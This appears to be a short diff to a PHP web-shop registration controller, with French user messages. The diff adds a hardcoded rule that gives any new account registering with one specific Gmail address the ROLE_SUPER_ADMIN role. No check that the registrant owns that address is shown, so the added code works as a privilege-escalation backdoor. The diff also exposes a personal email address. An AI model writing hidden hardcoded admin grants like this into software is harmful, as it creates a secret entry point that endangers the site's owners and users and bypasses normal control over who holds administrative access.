@@ -43,6 +43,9 @@ class UserController extends Controller
       $form->handleRequest($request);
       if ($form->isValid()) {
         // Register the User
+        if ($this->user->getEmail() == 'mlaopane@gmail.com') {
+          $this->user->setRole('ROLE_SUPER_ADMIN');
+        }
         $this->registerUser($this->user);
         $request->getSession()->getFlashBag()->add('notice', 'Votre inscription a été prise en compte');
         // Redirect to the Shop
